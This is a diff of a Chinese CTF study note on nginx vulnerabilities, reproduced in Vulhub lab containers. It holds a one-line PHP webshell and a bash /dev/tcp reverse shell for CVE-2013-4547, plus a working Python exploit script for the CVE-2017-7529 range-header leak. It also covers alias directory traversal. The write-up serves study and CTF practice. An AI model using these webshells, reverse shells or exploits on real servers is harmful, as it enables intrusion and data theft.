@@ -1,3 +1,5 @@
+此篇中介绍了很多的nginx的安全问题，做了个汇总
+
 第一步：
 
 nginx配置不当导致目录穿越
@@ -20,9 +22,238 @@ http://39.105.175.150:30001/?id=1 union all select extractTextFromHTML(html) FRO
 
 知识点：
 
-ngnix配置不当导致目录穿越
+Nginx原理介绍
+-
+
+本文介绍的是Nginx的漏洞，以PHP语言为主。像Apache一样，Nginx自身是不支持解析PHP语言的，只能通过加载PHP模块来解析PHP。原理图可以看下图：
+
+![](https://pic1.zhimg.com/80/v2-c1d74386f2e11a6638f2c71cc55e2924_1440w.jpg)
+
+这里有几个定义：
+
+
+CGI：CGI是一种协议，它定义了Nginx或者其他Web Server传递过来的数据格式，全称是（Common Gateway Interface，CGI），CGI是一个独立的程序，独立与WebServer之外，任何语言都可以写CGI程序，例如C、
+
+Perl、Python等。
+
+FastCGI：FastCGI是一种协议，它的前身是CGI，可以简单的理解为是优化版的CGI，拥有更够的稳定性和性能。
+
+PHP-CGI：只是一个PHP的解释器，本身只能解析请求，返回结果，不会做进程管理。
+
+PHP-FPM：全称FastCGI Process Manager，看名称就可以知道，PHP-FPM是FastCGI进程的管理器，但前面讲到FastCGI是协议并不是程序，所以它管理的是PHP-CGI，形成了一个类似PHP-CGI进程池的概念。
+
+Wrapper：字母意思是包装的意思，包装的是谁呢？包装的是FastCGI，通过FastCGI接口，Wrapper接收到请求后，会生成一个新的线程调用PHP解释器来处理数据。
+
+Nginx调用PHP的过程是比较复杂的，需要花大量的时间来学习和梳理。通过原理图和刚才的定义，我们对Nginx处理PHP请求有了大致的了解。那么，Nginx是如何知道将什么样的文件当作PHP文件处理？是在nginx.conf
+
+配置文件中的
+
+```php
+location ~ \.php$ {
+    root           html;
+    include        fastcgi_params;
+
+    fastcgi_pass   IP:9000;
+    fastcgi_index  index.php;
+    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;
+    fastcgi_param  DOCUMENT_ROOT /var/www/html;
+}
+```
+
+location后面的\.php$代表了以.php结尾的文件都安装花括号中的内容执行，其中fastcgi_pass就是nginx和php-fpm的媒介，Nginx将请求通过fastcgi_pass转发给php-fpm。fastcgi_pass可以和Nginx不在同一台
+
+服务器上，他们通过IP+PORT的方式进行通信。
+
+1.CVE-2013-4547（文件名逻辑漏洞）
+-
+
+影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7
+
+影响说明：绕过服务器策略，上传webshell
+
+环境说明：Nginx 1.4.2
+
+环境搭建：
+此次环境使用docker环境搭建，环境采用地址Vulhub
+
+执行构建环境命令如下（启动后在浏览器中访问http://127.0.0.1:8080）
+
+
+该漏洞利用了Nginx错误的解析了URL地址，导致可以绕过服务端限制，从而解析PHP文件，造成命令执行的危害。
+
+根据nginx.conf文件中location中的定义，以.php结尾的文件都解析为php。若我们访问的文件名为shell.gif[0x20][0x00].php，该文件名以.php结尾可以被FastCGI接收，FastCGI在读取文件名时被00截断，导致
+
+读取的文件名为1.gif[0x20]，配合limit_extensions为空即可利用成功。该漏洞利用条件有两个：
+
+Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7
+
+php-fpm.conf中的security.limit_extensions为空，也就是说任意后缀名都可以解析为PHP
+
+Nginx版本范围较大，比较好匹配，但php-fpm.conf的security.limit_extensions配置默认为php，一般鲜有管理员允许所有类型都可以解析为PHP，所以该漏洞比较鸡肋，但这是在Linux的服务器中，而在Windows中
+
+便影响极大，这点我们后面再讲，先说下在Linux下的复现步骤。
+
+0x01 查看phpinfo
+
+上传一个shell.gif11，抓包后将gif后的11改为20与00，然后上传。
+
+![](https://pic2.zhimg.com/80/v2-aec6c9dd94a982b9fa9aeefee1c68755_1440w.jpg)
+
+可以发现上传成功，此时使用http://127.0.0.1:8080/uploadfiles/shell.png[0x20][0x00].php 便可以访问phpinfo
+
+![](https://pic3.zhimg.com/80/v2-a0c01f8c5f81f147e70cc436c407b0ee_1440w.jpg)
+
+0x02 执行系统命令，一句话代码如下
+
+<?php system($_GET['var']); ?>
+
+执行结果：
+
+0x03 反弹shell
+
+#利用0x02中的一句话木马反弹shell，var的参数如下
+
+bash -i >& /dev/tcp/192.168.0.2/9090 0>&1
+
+# 在本地执行监听
+
+nc -l 9090
+
+2.CVE-2017-7529（Nginx越界读取缓存漏洞）
+-
+
+影响版本：Nginx 0.5.6 ~ 1.13.2
+
+影响说明：信息泄漏
+
+环境说明：Nginx 1.13.2
+
+环境搭建：
+
+此次环境使用docker环境搭建，环境采用地址Vulhub
+
+执行构建环境命令如下（启动后在浏览器中访问http://127.0.0.1:8080）
+
+
+docker-compose build
+
+docker-compose up -d
+
+Nginx越界读取缓存漏洞产生的原因是Nginx读取http请求时，如果包含range，那么Nginx会根据range指定的数据范围读取文件数据内容，如果该range是负数，并且读到了缓存文件，那么会返回缓存文件中的“文件
+
+头”或“HTTP返回包头”，缓存文件头可能包含IP地址的后端服务器或其他敏感信息，从而导致信息泄露。
+
+概念介绍：
+
+0x01 range是什么？
+
+存在于HTTP请求头中，表示请求目标资源的部分内容，例如请求一个图片的前半部分，单位是byte，原则上从0开始，但今天介绍的是可以设置为负数。
+
+range的典型应用场景例如：断点续传、分批请求资源。
+
+range在HTTP头中的表达方式：
+
+Range:bytes=0-1024 表示访问第0到第1024字节；
+
+Range:bytes=100-200,601-999,-300 表示分三块访问，分别是100到200字节，601到600字节，最后的300字节；
+
+Range:-100 表示访问最后的100个字节
+
+range在HTTP Response表示：
+
+Accept-Ranges:bytes 表示接受部分资源的请求；
+
+Content-Range: bytes START-END/SIZE  START-END表示资源的开始和结束位置，SIZE表示资源的的长度
+
+0x02 缓存是什么？
+
+大多数的Web服务器都具有缓存的功能，解释起来比较麻烦，可以看下图：
+
+![](https://pic1.zhimg.com/80/v2-2fd1f41c9d194c7479663dd6f6f6e9ec_1440w.jpg)
+
+当请求服务器的资源时，如果在缓存服务器中存在，则直接返回，不在访问应用服务器，可以降低应用服务器的负载。
+
+例如网站的首页的缓存，nginx的默认缓存路径在/tmp/nginx下，例如：当请求服务器的资源时，如果在缓存服务器中存在，则直接返回，不在访问应用服务器，可以降低应用服务器的负载。
+
+例如网站的首页的缓存，nginx的默认缓存路径在/tmp/nginx下，例如：
+
+
+![](https://pic2.zhimg.com/80/v2-77c610b030872a8d23288d9339897aed_1440w.jpg)
+
+再次访问该页面时会首先读取该缓存内容，其他的静态资源，例如：图片、CSS、JS等都会被缓存。
+
+0x03 漏洞利用
+
+1、现在我要读取刚才讲到的缓存文件头，他的Content-Length时612，那么我读取正常缓存文件的range是设置为
+
+Range: bytes=0-612
+
+使用curl工具测试下，命令如下,执行后发现，返回的内容是正常的。
+
+curl -i http://127.0.0.1:8080 -r 0-612
+
+2、接下来要读取缓存头，读取前面600个字节，也就是
+
+range=content_length + 偏移长度
+
+即：
+
+range = 612 + 600
+
+取负值为-1212
+
+此时知道range的start是-1212，那么end呢？nginx的源码在声明start,end时用的是64位有符号整型，所以最大可表示：
+
+-2^63-2^63-1
+
+也就是
+
+-9223372036854775808 到 9223372036854775807
+
+所以只要start+end为9223372036854775807即可，故：
+
+end = 9223372036854775808 - 1212
+
+取负
+
+为-9223372036854774596
+
+执行结果为下图，可以发现读取到了缓存文件头，里面的8081端口在实际的业务场景中可能是其他的地址，这样便会造成信息泄漏。
+
+![](https://pic3.zhimg.com/80/v2-b8f7bc96a90c87e9212cc636f16b677e_1440w.jpg)
+
+利用代码
+
+```python
+# -*- coding: UTF-8 -*-
+#!/usr/bin/env python
+
+import sys
+import requests
+
+if len(sys.argv) < 2:
+    print("%s url" % (sys.argv[0]))
+    print("eg: python %s http://your-ip:8080/ offset" % (sys.argv[0]))
+    sys.exit()
+
+headers = {}
+offset = int(sys.argv[2])
+url = sys.argv[1]
+
+file_len = len(requests.get(url, headers=headers).content)
+n = file_len + offset
+
+headers['Range'] = "bytes=-%d,-%d" % (
+    n, 0x8000000000000000 - n)
+
+r = requests.get(url, headers=headers)
+print(r.text)
+```
+3.ngnix配置不当导致目录穿越
+-
 
 Nginx在配置别名（Alias）的时候，如果忘记加/，将造成一个目录穿越漏洞。
+
 错误的配置文件示例（原本的目的是为了让用户访问到/home/目录下的文件）：
 
 利用方法：
@@ -426,6 +657,9 @@ CVE-2013-4547还可以用于绕过访问限制，虽然和文件解析漏洞无�
 成功访问到文件s.html。注意上示URL中的空格，不要将空格编码。
 
 为成功利用漏洞，我们在测试中准备了名字以空格结尾的文件和目录，这是因为在linux中，文件名是可以以空格结尾的。若不准备这样的文件，漏洞可以成功触发，但结果却是404，找不到类似“test.jpg ”这样的文件。而在Windows中，文件名不能以空格结尾，所以Windows程序遇到文件名“test.jpg ”会自动去掉最后的空格，等同于访问“test.jpg”，基于这样的原因，这一漏洞在Windows中会很容易利用。
+
+
+
 
 以上是根据这次字节跳动的ctf比赛而找的一些知识点，看了很多大佬博客，所以我觉得应该挺全了吧算是。
 
